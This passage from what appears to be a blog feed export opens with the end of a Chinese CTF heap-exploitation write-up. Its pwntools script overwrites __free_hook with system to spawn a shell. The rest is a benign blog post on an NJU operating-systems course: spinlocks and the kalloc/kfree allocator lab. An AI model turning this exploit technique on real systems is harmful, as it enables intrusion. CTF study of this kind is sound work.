class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>), <span class="string">&#x27;a\n&#x27;</span>)                              <span class="comment">#0 chunk_base</span></span><br><span class="line">node_del(r, <span class="number">1</span>)</span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>), <span class="string">&#x27;a\n&#x27;</span>)                 <span class="comment">#1 chunk_base + 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">node_del(r, <span class="number">3</span>)</span><br><span class="line">node_del(r, <span class="number">2</span>)</span><br><span class="line">node_del(r, <span class="number">1</span>)</span><br><span class="line">node_del(r, <span class="number">9</span>)</span><br><span class="line">free_hook = lib_base + lib_file.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x7f0d689bbb28</span> + <span class="number">0x7f0d687f6b28</span></span><br><span class="line">log.info(<span class="string">&#x27;__free_hook =&gt; %x&#x27;</span>%(free_hook))</span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) * ((<span class="number">0x70</span> - <span class="number">0x30</span>) / <span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(free_hook), <span class="string">&#x27;a\n&#x27;</span>)                          <span class="comment">#1 chunk_base + 0x30</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;/bin/bash\x00&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)                       <span class="comment">#2 chunk_base + 0x80</span></span><br><span class="line"></span><br><span class="line">system = lib_base + lib_file.sym[<span class="string">&#x27;system&#x27;</span>] - <span class="number">0x7f0d688449f0</span> + <span class="number">0x7f0d6867f9f0</span></span><br><span class="line">log.info(<span class="string">&#x27;system =&gt; %x&#x27;</span>%(system))</span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(system), <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">node_del(r, <span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里需要特别说明一下，由于fake chunk的大小是0x470，我们无法分配到。因此，我们首先需要通过覆写<code>idx = 0</code>的chunk，重新设置fake chunk的大小。<br>另一方面，由于之后会释放该fake chunk，因此需要覆写<code>idx = 1</code>的chunk，为其绕过检查构造出一个0x20的正在使用的pre chunk、两个0x20的正在使用的next chunk。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-四</title>
      <link href="/2021/08/10/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%9B%9B/"/>
      <url>/2021/08/10/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  jyy老师太强了。这一章介绍一下并发控制中互斥相关的内容，并实现课程中的L1实验</p><h1 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h1><p>  实现共享内存上的互斥，并不是一个非常简单的事情:</p><ol><li>系统不能<strong>同时</strong>读/写共享内存(除了原子指令)，即<code>load</code>时不能写，只能单纯的读;而写的时候，无法进行读(即使类似于<code>addq $1, [sum]</code>这种指令，其也是分为读值、计算和写值三部分)。从而当一个线程完成状态读取和状态设置时，其实这两者之间可能状态已经发生了变化(另一个线程完成了状态读取和状态设置)</li><li>系统可能<strong>乱序</strong>执行指令。可能有些精妙的算法可以规避1.中的问题，例如<strong>Peterson算法</strong>。但是现代操作系统可能的指令乱序执行(即可能在读之前完成写)，也会导致互斥的失败</li></ol><p>  可以看到，单纯的从软件上实现共享内存的互斥是非常困难的一件事情，因此这就往往需要硬件上进行协调配合!<br>  硬件可以通过诸如锁总线的方式，原子的实现<strong>load-exec-store</strong>指令，从而为我们实现共享内存上的互斥提供了有效的解决方法。<br>  这些原子指令，完美的解决了上面的两个难点，因此很容易就实现共享内存的互斥。这些方案往往简洁，且很好理解，如下面基于<strong>xchg</strong>的自选锁实现的共享内存的互斥。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">while</span>(xchg(&amp;locked, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">xchg(&amp;locked, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  可以看到，由于<strong>xchg</strong>是原子的，因此任何时候，永远只可能有一个线程，在执行<strong>lock</strong>或<strong>unlock</strong>中的<strong>xchg</strong>指令，而只要有线程成功获取了锁(<strong>xchg</strong>返回的值为0)，则其同时会将<code>locked</code>的值设置为1，直到其归还锁之前，不会再有其他人获取锁。因此其简洁的实现了共享内存的互斥</p><h1 id="L1物理内存管理-pmm"><a href="#L1物理内存管理-pmm" class="headerlink" title="L1物理内存管理(pmm)"></a>L1物理内存管理(pmm)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  从这次实验开始，我们将真正的开始实现一个操作系统。<br>  在实现操作系统内核时，经常会需要为操作系统中新增的对象分配存储空间。在这些对象不再使用时，有需要将这些对象的内存进行回收。例如在前面的<strong>M2</strong>中调用<code>co_start</code>分配协程结构体资源;调用<code>co_wait</code>回收上述分配的资源。<br>  当然，对于迷你自制的操作系统来说，每种类型的资源都进行手工分配和释放是完全可行的。但是实现内存的自动分配和释放，可以简化操作系统内核中很多部分的代码，是十分值得的。<br>  在本次实验中，需要亲自体验平常使用的<strong>malloc</strong>/<strong>free</strong>应该如何实现。在多处理器系统中，各个处理器上的代码会并发地申请或释放内存，这会给内存分配和释放带来额外的挑战——一方面，希望不同处理器可以并行、高效地申请内存，少量甚至不会出现同时申请而产生一个处理器等待另一个处理器的情况;另一方面，不希望<strong>malloc</strong>/<strong>free</strong>仅仅通过简单粗暴使用一把互斥锁来保护，从而降低了内存管理的效率</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p><u>实验要求1:实现多处理器安全的内存分配和回收</u></p><blockquote><p>类似于<strong>malloc</strong>/<strong>free</strong>，在bare-metal上实现内存分配/回收的函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">kalloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"><span class="comment">//内存分配</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line"><span class="comment">//内存释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在AbstractMachine启动后，$[heap.start, heap.end]$都是可用的物理内存(堆区)，<code>kalloc</code>返回的内存必须位于这个区间中。具体来说这个实验中你需要实现一个数据结构，维护一个不相交区间的集合(堆区)</p><script type="math/tex; mode=display">H = \{[\mathcal{l}_{0},\mathcal{r}_{0}),[\mathcal{l}_{1},\mathcal{r}_{1}),....,[\mathcal{l}_{n},\mathcal{r}_{n})\}</script><p>初始时，堆区为空。假设当前堆区为$H$，$heap.start = L，heap.end = R$</p><ul><li>`kalloc(s)分配s字节的内存$[\mathcal{l}, \mathcal{r})$满足<br>  分配发生在堆区中<script type="math/tex">(L \le \mathcal{l} < \mathcal{r} \le R)</script><br>  分配的内存不与已分配内存重叠(<script type="math/tex">\forall[\mathcal{l}_{i}, \mathcal{r}_{i}) \in H. [\mathcal{l}, \mathcal{r}) \cap [\mathcal{l}_{i}, \mathcal{r}_{i}) = \emptyset</script>)<br>得到新的堆区<script type="math/tex; mode=display">H^{'} = H \cup \{[\mathcal{l}, \mathcal{r})\}</script>并返回新分配区间的左端点$\mathcal{l}$</li><li>`kfree($\mathcal{l}$)删除一个已有区间$[\mathcal{l}, \mathcal{r}) \in H$，得到新的堆区<script type="math/tex; mode=display">H^{'} = H \setminus \{[\mathcal{l}, \mathcal{r})\}</script>当$\mathcal{l}$不是$H$中任何一个区间左端点时，产生<strong>undefined behavior</strong></li></ul></blockquote><p>除了上面的抽象描述，还有一些作为<strong>计算机系统软件基础设施</strong>的要求:</p><ul><li>对于大小为$s$的内存分配请求，返回的内存地址必须对齐到$2^{i}$，其中$i$是最小的满足$2^{i} \ge s$。例如，分配17字节内存返回的地址必须是32的整数倍</li><li>在分配算法不能找到足够的内存继续分配时，返回<code>NULL(0)</code><ul><li>受分配算法的局限，可能系统中仍然有空闲的内存，但形成了碎片的内存，或者单纯是分配算法不能找到这些内存而导致失败，这是允许的。</li></ul></li><li>由于这些API仅仅在自制的操作系统内核中使用，可以直接拒绝超过16MB的内存分配</li><li>不必初始化返回的内存，当然，对返回的内存赋上初始值是个不错的主意</li><li>最重要的要求在于<strong>允许多处理器并行地调用<code>kalloc</code>/<code>kfree</code></strong>:<ul><li>不同的处理器可能同时执行<code>kalloc</code>分配大小不同的内存</li><li>不同的处理器可能同时执行<code>kfree</code>释放内存</li><li>在一个处理器分配的内存，可能在另一个处理器上释放</li><li>在<code>kalloc</code>/<code>kfree</code>实现正确的前提下，尽可能使不同处理器上的内存分配能够并行</li></ul></li></ul><p><u>实验要求2:实现AbstractMachine中缺失的函数</u></p><blockquote><p>在L0中，已经提出了这个实验要求。从现在开始，正式建议实现klib里缺失的函数——没有<code>printf</code>、<code>sprintf</code>等函数，根本就是在使用汇编语言写操作系统</p></blockquote></blockquote><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><h3 id="代码组织与运行"><a href="#代码组织与运行" class="headerlink" title="代码组织与运行"></a>代码组织与运行</h3><p>  实验框架代码由三个目录组成:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">+--framework-&gt;框架代码;可以在本地修改</span><br><span class="line">|+--kernel.h</span><br><span class="line">|+--main.c</span><br><span class="line">+--include-&gt;头文件;可以自由修改/创建文件</span><br><span class="line">|+--common.h</span><br><span class="line">+--Makefile</span><br><span class="line">+--src-&gt;源文件; 可以自由修改/创建文件</span><br><span class="line">    +--os.c</span><br><span class="line">    +--pmm.c</span><br></pre></td></tr></table></figure><p>  可以使用前面提到的技巧(即执行<code>make -nB  | sed &quot;s/^/\n/g&quot; | sed &quot;s/ /\n\t/g&quot;</code>，观察并了解整个系统镜像的生成过程:</p><ol><li>首先，其编译相关的源文件,生成目标文件，样例如下所示<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">x86_64-linux-gnu-gcc</span><br><span class="line">        -std=gnu11</span><br><span class="line">        -O2</span><br><span class="line">        -MMD</span><br><span class="line">        -Wall</span><br><span class="line">        -Werror</span><br><span class="line">        -ggdb</span><br><span class="line">        -Iinclude/</span><br><span class="line">        -Iframework/</span><br><span class="line">        -I/home/hawk/Desktop/nju/kernel/include</span><br><span class="line">        -I/home/hawk/Desktop/nju/kernel/../abstract-machine/am/include/</span><br><span class="line">        -I/home/hawk/Desktop/nju/kernel/../abstract-machine/klib/include/</span><br><span class="line">        -D__ISA__=\&quot;x86_64\&quot;</span><br><span class="line">        -D__ISA_X86_64__</span><br><span class="line">        -D__ARCH__=x86_64-qemu</span><br><span class="line">        -D__ARCH_X86_64_QEMU</span><br><span class="line">        -D__PLATFORM__=qemu</span><br><span class="line">        -D__PLATFORM_QEMU</span><br><span class="line">        -DARCH_H=\&quot;<span class="built_in">arch</span>/x86_64-qemu.h\&quot;</span><br><span class="line">        -fno-asynchronous-unwind-tables</span><br><span class="line">        -fno-builtin</span><br><span class="line">        -fno-stack-protector</span><br><span class="line">        -Wno-main</span><br><span class="line">        -m64</span><br><span class="line">        -fPIC</span><br><span class="line">        -mno-sse</span><br><span class="line">        -c</span><br><span class="line">        -o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/x86_64-qemu/framework/main.o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/framework/main.c</span><br></pre></td></tr></table></figure></li><li>链接生成ELF文件，命令如下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x86_64-linux-gnu-ld</span><br><span class="line">        -melf_x86_64</span><br><span class="line">        -N</span><br><span class="line">        -Ttext-segment=0x00100000</span><br><span class="line">        -o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/kernel-x86_64-qemu.elf</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/x86_64-qemu/framework/main.o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/x86_64-qemu/./src/pmm.o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/x86_64-qemu/./src/os.o</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/../abstract-machine/am/build/am-x86_64-qemu.a</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/../abstract-machine/klib/build/klib-x86_64-qemu.a</span><br></pre></td></tr></table></figure></li><li><p>最后，生成可以运行的磁盘镜像文件，其命令如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">        <span class="built_in">cat</span></span><br><span class="line">        /home/hawk/Desktop/nju/kernel/../abstract-machine/am/src/x86/qemu/boot/bootblock.o;</span><br><span class="line">        <span class="built_in">head</span></span><br><span class="line">        -c</span><br><span class="line">        1024</span><br><span class="line">        /dev/zero;</span><br><span class="line">        <span class="built_in">cat</span></span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/kernel-x86_64-qemu.elf</span><br><span class="line">        )</span><br><span class="line">        &gt;</span><br><span class="line">        /home/hawk/Desktop/nju/kernel/build/kernel-x86_64-qemu</span><br></pre></td></tr></table></figure><p>如果想要运行的话，和之前L0的实验是类似的，使用make即可执行，指令如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make run ARCH=x86_64-qemu</span><br></pre></td></tr></table></figure><p>如果要启动多个处理器，则传递<code>smp</code>环境变量即可，执行如下命令即可启动4各处理器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make run ARCH=x86_64-qemu smp = 4</span><br></pre></td></tr></table></figure></li></ol><h3 id="框架代码导读"><a href="#框架代码导读" class="headerlink" title="框架代码导读"></a>框架代码导读</h3><p>  框架代码很短，其从<code>main</code>函数首先执行os的初始化，然后启动多个处理器，每个处理器都跳转到<code>os-&gt;run</code>执行<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  os-&gt;init();</span><br><span class="line">  mpe_init(os-&gt;run);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  <code>os</code>是一个操作系统的<strong>模块</strong>，可以看成是使用C实现的面向对象的编程，可曾强代码的可读性。其主要借助于下面的宏，实现模块的声明和定义<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MODULE(mod) \</span></span><br><span class="line"><span class="meta">  typedef struct mod_##mod##_t mod_##mod##_t; \</span></span><br><span class="line"><span class="meta">  extern mod_##mod##_t *mod; \</span></span><br><span class="line"><span class="meta">  struct mod_##mod##_t</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULE_DEF(mod) \</span></span><br><span class="line"><span class="meta">  extern mod_##mod##_t __##mod##_obj; \</span></span><br><span class="line"><span class="meta">  mod_##mod##_t *mod = &amp;__##mod##_obj; \</span></span><br><span class="line"><span class="meta">  mod_##mod##_t __##mod##_obj</span></span><br></pre></td></tr></table></figure></p><p>  上面<code>MODULE</code>用来声明一个模块，而使用<code>MODULE_DEF</code>来真正的定义这个模块。当然，这样子的视觉效果不是很好，可以将前面相关的编译命令中的<strong>-c</strong>参数更换为<strong>-E</strong>，其有如下形式的代码<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">mod_os_t</span> <span class="title">mod_os_t</span>;</span> <span class="keyword">extern</span> <span class="type">mod_os_t</span> *os; <span class="class"><span class="keyword">struct</span> <span class="title">mod_os_t</span> &#123;</span></span><br><span class="line">  <span class="type">void</span> (*init)();</span><br><span class="line">  <span class="type">void</span> (*run)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">mod_os_t</span> __os_obj; <span class="type">mod_os_t</span> *os = &amp;__os_obj; <span class="type">mod_os_t</span> __os_obj = &#123;</span><br><span class="line">  .init = os_init,</span><br><span class="line">  .run = os_run,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>  实际上想要读懂这份宏，需要弄明白二点:</p><ol><li>宏是字面替换，<code>MODULE(mod)</code>中所有的<strong>mod</strong>都会被替换掉</li><li><strong>##</strong>是C语言用来拼接标识符的机制，<code>sys ## tem</code>，可以得到<code>system</code></li></ol><h3 id="框架代码的运行"><a href="#框架代码的运行" class="headerlink" title="框架代码的运行"></a>框架代码的运行</h3><p>  在当前的操作系统内核中，目前只有两个函数</p><ul><li><code>os-&gt;init()</code>，其完成操作系统所有部分的初始化。<code>os_init()</code>运行在系统启动后的第一个处理器上，中断处于关闭状态;此时系统中的其他处理器尚未被启动</li><li><code>os-&gt;run()</code>是所有处理器的入口，在初始化完成后，框架代码调用<code>mpe_init(os-&gt;run)</code>，启动所有处理器执行。原始框架代码中，<code>os-&gt;run</code>只是打印<strong>Hello World</strong>之后就开始死循环;你之后可以在<code>os-&gt;run</code>中添加各种测试代码</li></ul><h3 id="实现kalloc-kfree"><a href="#实现kalloc-kfree" class="headerlink" title="实现kalloc/kfree"></a>实现<code>kalloc</code>/<code>kfree</code></h3><p>  相关的实现主要在<strong>pmm(physical memory management)</strong>模块:<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MODULE(pmm) &#123;</span><br><span class="line"><span class="type">void</span> (*init)();</span><br><span class="line"><span class="type">void</span> *(alloc)(<span class="type">size_t</span> size);</span><br><span class="line"><span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  该模块共包含三个函数指针:</p><ul><li><code>pmm-&gt;init()</code>初始化<code>pmm</code>模块，其应该在多处理器启动前，即<code>os-&gt;init()</code>中调用。这里应该实现数据结构、锁的初始化等</li><li><code>pmm-&gt;alloc()</code>，即对应实验要求中的<code>kalloc</code></li><li><code>pmm-&gt;free()</code>，即对应实验要求中的<code>kfree</code></li></ul><h3 id="测试-调试代码"><a href="#测试-调试代码" class="headerlink" title="测试/调试代码"></a>测试/调试代码</h3><h4 id="构建测试框架"><a href="#构建测试框架" class="headerlink" title="构建测试框架"></a>构建测试框架</h4><p>  AbstractMachine代码的调试是比较困难的——无论是native，亦或是在qemu模拟器中。因此，同构构建一个测试框架，对于定位bug是非常有用的<br>  下面以调用<strong>thread.h</strong>中API为例，构建一个测试代码框架<br>  首先创建一个<strong>test</strong>目录，用于存放和测试相关的代码，如下所示<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">  +——am.h一个空的am.h</span><br><span class="line">  +——common.h</span><br><span class="line">  +——test.c</span><br><span class="line">  +——threads.h前面课程中给出的pthread包装API</span><br></pre></td></tr></table></figure></p><p>  为了修改最少的代码，并且能够兼容已有的项目，可以在<strong>pmm.c</strong>文件中，增加一些条件编译，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TEST</span></span><br><span class="line"><span class="comment">// 框架代码中的 pmm_init (在 AbstractMachine 中运行)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">uintptr_t</span> pmsize = ((<span class="type">uintptr_t</span>)heap.end - (<span class="type">uintptr_t</span>)heap.start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got %d MiB heap: [%p, %p)\n&quot;</span>, pmsize &gt;&gt; <span class="number">20</span>, heap.start, heap.end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">// 测试代码的 pmm_init ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *ptr  = <span class="built_in">malloc</span>(HEAP_SIZE);</span><br><span class="line">  heap.start = ptr;</span><br><span class="line">  heap.end   = ptr + HEAP_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got %d MiB heap: [%p, %p)\n&quot;</span>, HEAP_SIZE &gt;&gt; <span class="number">20</span>, heap.start, heap.end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>  接着在对应的Makefile文件中，增加一个编译目标<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">test: git</span></span><br><span class="line">        @gcc <span class="variable">$(<span class="built_in">shell</span> find src/ -name &quot;*.c&quot;)</span>  \</span><br><span class="line">             <span class="variable">$(<span class="built_in">shell</span> find test/ -name &quot;*.c&quot;)</span> \</span><br><span class="line">             -Iframework -Itest -DTEST -lpthread \</span><br><span class="line">             -o build/test</span><br><span class="line">        @build/test</span><br></pre></td></tr></table></figure></p><h4 id="设计测试用例"><a href="#设计测试用例" class="headerlink" title="设计测试用例"></a>设计测试用例</h4><p>  为了确保代码在各种场合下，都可以正常的运行，需要尝试各种类型下的极端测试。此时，可以简单的利用前面构建的代码框架，批量地运行很多测试，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">switch</span>(atoi(argv[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: do_test_0();</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: do_test_1();</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  然后在Makefile里批量地进行运行，如下所示<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">testall: test</span></span><br><span class="line">        @build/test 0</span><br><span class="line">        @build/test 1</span><br><span class="line">        @build/test 2</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure></p><h4 id="性能调优"><a href="#性能调优" class="headerlink" title="性能调优"></a>性能调优</h4><p>  此时需要选取适当的<strong>workload</strong>进行调优，并且确定程序的性能瓶颈。理解程序性能的最好方法是使用正确的工具:<strong>profiler</strong>。作为本地进程运行的测试用例，其可以使用Linux系统自带的各种工具，快速的判断程序的性能瓶颈</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  类似的，切换到master分支，然后从github上拉取<strong>L1</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy L1</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/cde6b41796b3b253d3d93ab5c54669c5f628e1af">实验实现</a></p><h3 id="测试框架"><a href="#测试框架" class="headerlink" title="测试框架"></a>测试框架</h3><p>  虽然按照实验指南的说明，对于多处理器的AbstractMachine来说，无论是在native亦或是QEMU模拟器中，由于AM APIs都和系统有紧密的耦合，因此调试起来并不是很方便。但实际上并非如此——在gdb中，无论是在QEMU模拟器中、亦或是native中，多处理器中的每一个处理器都相当于一个线程，因此使用gdb中调试多线程的方式来调试AbstractMachine代码即可<br>  不妨以QEMU模拟器为例，我们执行如下命令启动多处理器的AbstractMachine，其中<strong>smp</strong>参数指定多处理器数量<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(QEMU) -gdb tcp::1737 -S -serial stdio -smp $(smp) -drive format=raw,file=./build/kernel-$(ARCH) -no-reboot -no-shutdown</span><br></pre></td></tr></table></figure></p><p>  然后在终端启动gdb，调试QEMU远程开启的远程gdb服务器，执行如下命令即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex <span class="string">&quot;target remote localhost:1737&quot;</span> -ex <span class="string">&quot;dir ./src&quot;</span> ./build/kernel-x86_64-qemu.elf</span><br></pre></td></tr></table></figure></p><p>  